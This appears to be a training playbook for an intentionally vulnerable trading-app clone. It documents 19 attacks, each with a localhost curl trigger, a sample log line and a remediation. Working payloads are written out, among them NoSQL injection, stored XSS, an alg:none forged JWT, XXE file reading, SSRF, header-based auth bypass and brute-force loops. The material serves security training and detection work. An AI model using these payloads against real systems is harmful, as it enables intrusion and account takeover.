# Complete Vulnerabilities Playbook & Attack Reference (Phase 1 & Phase 2)

This document is the definitive master reference for all **19 vulnerability scenarios** implemented within the Zerodha-clone target application. It is specifically designed for cybersecurity training, SOC analysts, and the MAD-PS detection pipeline training on real attack logs.

---

## 1. Environment Configuration & Lab Accounts

### Vulnerability Switch
- **Backend Toggle (.env)**: `VULN_MODE=true` (exploitable) | `VULN_MODE=false` (safe/hardened)
- **Frontend Toggle (.env)**: `REACT_APP_VULN_MODE=true` (exploitable) | `REACT_APP_VULN_MODE=false` (safe/hardened)

### Seeded Lab Test Accounts (Non-Production / Synthetic)
| Username | Role | Account Balance | Purpose |
|----------|------|-----------------|---------|
| `admin` | `superadmin` | ₹1,500,000.00 | Privileged administrative actions, data exfil target |
| `trader_alice` | `trader` | ₹45,000.50 | Standard investor, IDOR and session attack target |
| `trader_bob` | `trader` | ₹890,000.00 | High-value account for security testing |
| `guest_trader` | `trader` | ₹10,000.00 | Low-privilege demo user |
| `user_weakpass` | `trader` | ₹25,000.00 | Attack #11: Seeded weak password single-shot demo account |
| `breach_user_alpha` | `trader` | ₹75,000.00 | Attack #12: Simulated breached credentials fixture account #1 |
| `breach_user_beta` | `trader` | ₹50,000.00 | Attack #12: Simulated breached credentials fixture account #2 |
| `breach_user_gamma` | `trader` | ₹120,000.00 | Attack #12: Simulated breached credentials fixture account #3 |
| `user_spray` | `trader` | ₹60,000.00 | Attack #13: Common-password seeded account for password spraying |
| `victim_takeover` | `trader` | ₹320,000.00 | Attack #14: Predictable password reset token victim account |
| `victim_idor` | `trader` | ₹12,500,000.00 | Attack #15: Distinctive institutional order IDOR target account |
| `victim_csrf` | `trader` | ₹450,000.00 | Attack #17: Active session cookie CSRF victim account |

---

## 2. Phase 1 Vulnerabilities (Foundations & Quick-Wins)

---

### ATTACK 1: NoSQL Injection
- **Category Tag**: `nosql-injection`
- **Route / Endpoint**: `GET /allOrders`
- **Vulnerable Code**: `backend/index.js` (`// VULN: nosql-injection`)
- **Description**: Accepts an unvalidated `filter` query parameter that is passed directly into Mongoose `find()`, allowing MongoDB operators (`$gt`, `$ne`, `$regex`, `$where`) to extract unauthenticated order records.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -G "http://localhost:3002/allOrders" --data-urlencode 'filter={"qty":{"$gt":0}}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:54.834Z","ip":"::1","endpoint":"/allOrders?filter=%7B%22qty%22%3A%7B%22%24gt%22%3A0%7D%7D","method":"GET","payload":{"body":{},"query":{"filter":"{\"qty\":{\"$gt\":0}}"},"params":{}},"category":"nosql-injection"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Rejects any filter containing keys starting with `$` or non-primitive structures with HTTP 400 Bad Request.

---

### ATTACK 2: Stored Cross-Site Scripting (XSS)
- **Category Tag**: `xss-stored`
- **Route / Component**: `POST /newOrder` (notes) & `POST /newTicket` (message), rendered in [Orders.js](file:///c:/Users/Hp/Desktop/OKOK/frontend/src/dashboard/components/Orders.js) and [CreateTicket.js](file:///c:/Users/Hp/Desktop/OKOK/frontend/src/landing_page/support/CreateTicket.js)
- **Vulnerable Code**: `backend/index.js`, `Orders.js`, `CreateTicket.js` (`// VULN: xss-stored`)
- **Description**: Stores raw, unescaped HTML/JavaScript payloads in orders or support tickets, which are subsequently rendered in the frontend DOM using `dangerouslySetInnerHTML` without sanitization.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/newTicket -H "Content-Type: application/json" -d '{"topic":"Account Security","email":"tester@security.lab","message":"<script>alert(\"XSS_TICKET\")</script>"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:54.845Z","ip":"::1","endpoint":"/newTicket","method":"POST","payload":{"body":{"topic":"Account Security","email":"tester@security.lab","message":"<script>alert('XSS_TICKET')</script>"},"query":{},"params":{}},"category":"xss-stored"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: HTML-entity encodes all input strings server-side and renders text nodes natively in React without `dangerouslySetInnerHTML`.

---

### ATTACK 3: Open Redirect
- **Category Tag**: `open-redirect`
- **Route / Component**: `frontend/src/landing_page/OpenAccount.js`
- **Vulnerable Code**: `OpenAccount.js` (`// VULN: open-redirect`)
- **Description**: The Open Account signup completion flow consumes a `?redirect=` URL query parameter and directly navigates via `window.location.href = redirectUrl` without validating the host or scheme.
- **Trigger Browser URL (`VULN_MODE=true`)**:
  ```text
  http://localhost:3000/?redirect=https://evil-phishing-target.com
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:34:56.789Z","ip":"::1","endpoint":"/?redirect=https://evil-phishing-target.com","method":"GET","payload":{"body":{},"query":{"redirect":"https://evil-phishing-target.com"},"params":{}},"category":"general"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Rejects absolute URLs, protocol-relative paths (`//`), and external protocols, only allowing internal paths starting with `/`.

---

### ATTACK 4: Business Logic Abuse (Price & Quantity Tampering)
- **Category Tag**: `business-logic`
- **Route / Endpoint**: `POST /newOrder`
- **Vulnerable Code**: `backend/index.js` (`// VULN: business-logic`)
- **Description**: Trusts user-supplied `price` and allows negative or zero `qty` values without verifying market price thresholds or positive integer quantities.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/newOrder -H "Content-Type: application/json" -d '{"name":"RELIANCE","qty":-100,"price":0.001,"mode":"BUY","notes":"Tampered trade"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:54.840Z","ip":"::1","endpoint":"/newOrder","method":"POST","payload":{"body":{"name":"RELIANCE","qty":-100,"price":0.001,"mode":"BUY","notes":"Tampered trade"},"query":{},"params":{}},"category":"business-logic"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Enforces server-side validation: `qty > 0`, `price > 0`, returning HTTP 400 for invalid inputs.

---

### ATTACK 5: API Abuse (Unbounded Collections & Oversized Payloads)
- **Category Tag**: `api-abuse`
- **Route / Endpoint**: `GET /allHoldings`, `GET /allPositions`, `GET /allOrders`
- **Vulnerable Code**: `backend/index.js` (`// VULN: api-abuse`)
- **Description**: Returns unmetered database collections without cursor or pagination limits, and permits oversized request bodies (up to 50MB) without size constraints.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl http://localhost:3002/allHoldings
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:54.823Z","ip":"::1","endpoint":"/allHoldings","method":"GET","payload":{"body":{},"query":{},"params":{}},"category":"api-abuse"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Enforces `page` and `limit` query parameters (capped at max 100 items per response) and restricts payload sizes to 10KB.

---

### ATTACK 6: Missing Rate Limiting
- **Category Tag**: `no-rate-limit`
- **Route / Endpoint**: Global API routes (`backend/index.js`)
- **Vulnerable Code**: `backend/index.js` (`// VULN: no-rate-limit — intentional, see VULNERABILITIES.md`)
- **Description**: No rate limiting or request throttling is applied in vulnerable mode, allowing high-frequency automated scraping and brute-force bursts.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  for i in {1..200}; do curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3002/allOrders; done
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:35:52.636Z","ip":"::1","endpoint":"/allOrders","method":"GET","payload":{"body":{},"query":{},"params":{}},"category":"api-abuse"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Applies `express-rate-limit` middleware across all routes (100 requests per 15-minute window per IP), returning HTTP 429 Too Many Requests upon breach.

---

### ATTACK 7: Broken Access Control & Data Exfiltration
- **Category Tag**: `data-exfil`
- **Route / Endpoint**: `GET /admin/exportAll`
- **Vulnerable Code**: `backend/index.js` (`// VULN: data-exfil`)
- **Description**: An administrative database export endpoint provides unauthenticated access to complete holdings, positions, orders, support tickets, and user accounts.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl http://localhost:3002/admin/exportAll
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.435Z","ip":"::1","endpoint":"/admin/exportAll","method":"GET","payload":{"body":{},"query":{},"params":{}},"category":"data-exfil"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Requires valid admin bearer credentials (`Authorization: Bearer admin-secret-token`), returning HTTP 403 Forbidden otherwise.

---

## 3. Phase 2 Vulnerabilities (Authentication & Advanced Attacks)

---

### ATTACK 8: JWT / Token Abuse
- **Category Tag**: `jwt-abuse`
- **Route / Endpoint**: Authenticated endpoints (`/order/:id`, `/user/:id/*`)
- **Vulnerable Code**: `backend/index.js` (`// VULN: jwt-abuse`)
- **Description**: Accepts tokens signed with `alg: none` or tokens forged using the weak hardcoded secret `"secret123"`. Tokens are minted without an `exp` expiration timestamp.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  # Forged unsigned token with payload: {"username":"admin","role":"superadmin"}
  curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ." http://localhost:3002/order/ord_102
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:48.253Z","ip":"::1","endpoint":"/order/ord_102","method":"GET","payload":{"body":{},"query":{},"params":{}},"category":"idor"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Strictly enforces `HS256` signature verification using strong secret (`JWT_SECRET`) and rejects `alg: none` and expired tokens with HTTP 401.

---

### ATTACK 9: Session Hijacking (Token Stored in LocalStorage)
- **Category Tag**: `session-hijack`
- **Route / Component**: `POST /login`, `POST /signup`, and [Signup.js](file:///c:/Users/Hp/Desktop/OKOK/frontend/src/landing_page/signup/Signup.js)
- **Vulnerable Code**: `backend/index.js` & `Signup.js` (`// VULN: session-hijack`)
- **Description**: The authentication token is returned directly in the JSON response body and stored in client `localStorage`, making it susceptible to credential theft via client-side script injection.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/login -H "Content-Type: application/json" -d '{"username":"trader_alice","password":"password123"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:48.141Z","ip":"::1","endpoint":"/login","method":"POST","payload":{"body":{"username":"trader_alice","password":"password123"},"query":{},"params":{}},"category":"authentication"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Issues tokens exclusively inside `httpOnly`, `secure`, `SameSite=Strict` cookies that JavaScript cannot access.

---

### ATTACK 10: Session Fixation
- **Category Tag**: `session-fixation`
- **Route / Endpoint**: `POST /login`
- **Vulnerable Code**: `backend/index.js` (`// VULN: session-fixation`)
- **Description**: Reuses client-supplied session identifiers passed via `x-session-token` or `existingToken` during login without regenerating a fresh session token upon credential verification.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/login -H "Content-Type: application/json" -H "x-session-token: attacker-fixed-session-token-123" -d '{"username":"trader_alice","password":"password123"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:48.258Z","ip":"::1","endpoint":"/login","method":"POST","payload":{"body":{"username":"trader_alice","password":"password123"},"query":{},"params":{}},"category":"authentication"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Invalidate all prior session states and always generates a newly minted cryptographic JWT.

---

### ATTACK 11: Brute-Force Authentication
- **Category Tag**: `bruteforce`
- **Route / Endpoint**: `POST /login`
- **Vulnerable Code**: `backend/index.js` (`// VULN: bruteforce`)
- **Description**: No account lockout or exponential backoff delay is enforced after repeated failed login attempts against a single username.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  for pass in pass1 pass2 pass3 pass4 pass5; do curl -s -X POST http://localhost:3002/login -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"$pass\"}"; done
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:48.483Z","ip":"::1","endpoint":"/login","method":"POST","payload":{"username":"admin","failedAttemptCount":1},"category":"bruteforce"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Automatically locks the target user account for 15 minutes after 5 consecutive failed attempts, returning HTTP 429.

---

### ATTACK 12: Credential Stuffing
- **Category Tag**: `credential-stuffing`
- **Route / Endpoint**: `POST /login`
- **Vulnerable Code**: `backend/index.js` (`// VULN: credential-stuffing`)
- **Description**: No detection or throttling of high-velocity attempts across many distinct usernames from a single source IP address.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  for user in user_alpha user_beta user_gamma user_delta; do curl -s -X POST http://localhost:3002/login -H "Content-Type: application/json" -d "{\"username\":\"$user\",\"password\":\"Summer2026!\"}"; done
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.067Z","ip":"::1","endpoint":"/login","method":"POST","payload":{"username":"user_beta","failedAttemptCount":1},"category":"credential-stuffing"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Tracks distinct usernames attempted per IP address and throttles the IP with HTTP 429 upon exceeding 10 unique users in 5 minutes.

---

### ATTACK 13: Password Spraying
- **Category Tag**: `password-spraying`
- **Route / Endpoint**: `POST /login`
- **Vulnerable Code**: `backend/index.js` (`// VULN: password-spraying`)
- **Description**: Testing a single common password across multiple accounts from one IP without triggering cross-account lockout or anomaly detection.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/login -H "Content-Type: application/json" -d '{"username":"trader_bob","password":"Password@123"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.065Z","ip":"::1","endpoint":"/login","method":"POST","payload":{"username":"user_alpha","failedAttemptCount":1},"category":"password-spraying"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Enforces global cross-account rate limiting per IP address.

---

### ATTACK 14: Account Takeover via Weak Password Reset
- **Category Tag**: `account-takeover`
- **Route / Endpoint**: `POST /forgotPassword` & `POST /resetPassword`
- **Vulnerable Code**: `backend/index.js` (`// VULN: account-takeover`)
- **Description**: Generates a short, predictable 4-digit numeric reset token (1000–9999) with no expiration timestamp, enabling rapid brute-force account takeovers.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  # Step 1: Request reset
  curl -X POST http://localhost:3002/forgotPassword -H "Content-Type: application/json" -d '{"email":"alice@investor.com"}'
  # Step 2: Reset password using 4-digit token
  curl -X POST http://localhost:3002/resetPassword -H "Content-Type: application/json" -d '{"email":"alice@investor.com","token":"3985","newPassword":"NewHackedPassword123!"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.188Z","ip":"::1","endpoint":"/forgotPassword","method":"POST","payload":{"body":{"email":"alice@investor.com"},"query":{},"params":{}},"category":"account-takeover"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Generates 32-byte cryptographically secure random tokens (`crypto.randomBytes(32)`) with a strict 15-minute expiration timestamp.

---

### ATTACK 15: Insecure Direct Object Reference (IDOR)
- **Category Tag**: `idor`
- **Route / Endpoint**: `GET /order/:orderId`, `GET /user/:userId/holdings`, `GET /user/:userId/positions`
- **Vulnerable Code**: `backend/index.js` (`// VULN: idor`)
- **Description**: Accesses sensitive order and portfolio documents directly by parameter ID without verifying that the requesting user owns the requested record.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  # Access admin order ord_102 using trader_alice's token
  curl -H "Authorization: Bearer <ALICE_TOKEN>" http://localhost:3002/order/ord_102
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.301Z","ip":"::1","endpoint":"/order/ord_102","method":"GET","payload":{"body":{},"query":{},"params":{}},"category":"idor"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Verifies that `order.userId === req.user.username` (or `req.user.role === 'superadmin'`), returning HTTP 403 Forbidden on mismatch.

---

### ATTACK 16: Web Auth Bypass (Client-Header Trust)
- **Category Tag**: `auth-bypass`
- **Route / Endpoint**: `GET /admin/dashboard-stats`
- **Vulnerable Code**: `backend/index.js` (`// VULN: auth-bypass`)
- **Description**: Administrative metrics endpoint grants access when receiving the client-supplied header `x-is-admin: true` without cryptographically verifying a JWT token.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -H "x-is-admin: true" http://localhost:3002/admin/dashboard-stats
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.305Z","ip":"::1","endpoint":"/admin/dashboard-stats","method":"GET","payload":{"body":{},"query":{},"params":{}},"category":"auth-bypass"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Enforces cryptographic JWT verification and strictly validates `req.user.role === 'superadmin'`.

---

### ATTACK 17: Cross-Site Request Forgery (CSRF)
- **Category Tag**: `csrf`
- **Route / Endpoint**: `POST /changePassword`, `POST /newOrder`
- **Vulnerable Code**: `backend/index.js` (`// VULN: csrf`)
- **Description**: State-changing endpoints accept cookie-authenticated requests without validating an Anti-CSRF token header, enabling cross-origin exploit scripts.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/changePassword -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" -d '{"newPassword":"csrf_injected_password"}'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.308Z","ip":"::1","endpoint":"/changePassword","method":"POST","payload":{"body":{"newPassword":"csrf_victim_pass"},"query":{},"params":{}},"category":"csrf"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Enforces anti-CSRF token verification (`x-csrf-token` header matching session secret).

---

### ATTACK 18: Server-Side Request Forgery (SSRF)
- **Category Tag**: `ssrf`
- **Route / Endpoint**: `GET /news?url=<url>`
- **Vulnerable Code**: `backend/index.js` (`// VULN: ssrf`)
- **Description**: News preview endpoint fetches arbitrary user-supplied URLs without allow-list checks or private IP address restrictions, exposing internal services (`127.0.0.1:3002/admin/exportAll`) and cloud metadata (`169.254.169.254`).
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl "http://localhost:3002/news?url=http://localhost:3002/admin/exportAll"
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.425Z","ip":"::1","endpoint":"/news?url=http://localhost:3002/admin/exportAll","method":"GET","payload":{"body":{},"query":{"url":"http://localhost:3002/admin/exportAll"},"params":{}},"category":"ssrf"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Restricts destinations to approved news domains and blocks loopback/private IPv4 and IPv6 address ranges (`127.0.0.0/8`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`, `169.254.0.0/16`, `localhost`).

---

### ATTACK 19: XML External Entity (XXE) Injection
- **Category Tag**: `xxe`
- **Route / Endpoint**: `POST /importHoldings`
- **Vulnerable Code**: `backend/index.js` (`// VULN: xxe`)
- **Description**: XML portfolio import endpoint parses XML payloads with external entity (`SYSTEM`) resolution enabled, allowing reading server files (`file:///C:/Windows/win.ini`) and outbound probing.
- **Trigger Command (`VULN_MODE=true`)**:
  ```bash
  curl -X POST http://localhost:3002/importHoldings -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><holdings><stock>&xxe;</stock></holdings>'
  ```
- **Exact Structured Log Line**:
  ```json
  {"timestamp":"2026-08-15T12:50:49.440Z","ip":"::1","endpoint":"/importHoldings","method":"POST","payload":{"body":{"raw":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><holdings><stock>&xxe;</stock></holdings>"},"query":{},"params":{}},"category":"xxe"}
  ```
- **Safe Mode Remediation (`VULN_MODE=false`)**: Disallows DTD declarations and rejects XML containing `<!DOCTYPE` or `<!ENTITY` with HTTP 400 Bad Request.
